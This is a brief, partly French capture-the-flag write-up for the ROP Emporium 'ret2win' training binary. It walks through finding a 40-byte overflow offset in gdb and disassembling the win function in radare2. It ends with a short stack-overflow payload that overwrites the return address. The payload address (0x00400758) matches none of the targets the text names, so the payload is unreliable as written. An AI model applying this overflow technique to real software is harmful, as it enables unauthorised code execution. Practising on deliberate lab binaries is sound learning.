#  RopEmporium : ret2win

## TLDR


Call a function 
- Get fct addr 
- bufferoffset+addr 


## checksec 

```bash
$ checksec  ret2win
[*] '/home/yop/yolo/YoloToolbox/machines/ropemporium/01_ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
NX => rop 


## Buffer size 

```
gdb ret2win 
pattern_create 200 pattern
r < pattern
x/16xg $sp
pattern offset AA0AAFAAb
```
=> 40 bytes 


## Addr fct 

```
r2 ret2win 
aaaa
afl
pdf @ sym.ret2win

27: sym.ret2win ();
│           0x00400756      55             push rbp
│           0x00400757      4889e5         mov rbp, rsp
│           0x0040075a      bf26094000     mov edi, str.Well_done__Heres_your_flag: ; 0x400926 ; "Well done! Here's your flag:" ; const char *s
│           0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400764      bf43094000     mov edi, str._bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt" ; const char *string
│           0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0040076e      90             nop
│           0x0040076f      5d             pop rbp
└           0x00400770      c3             ret
```

On peut taper en 0x00400756 (entrée fct), 0x00400757 (entrée fct en évitant le push rpb) ou direct en 0x00400764 (call system(cat flag.txt)

## Payload 

payload = b'A' * 40
payload += p64(0x00400758)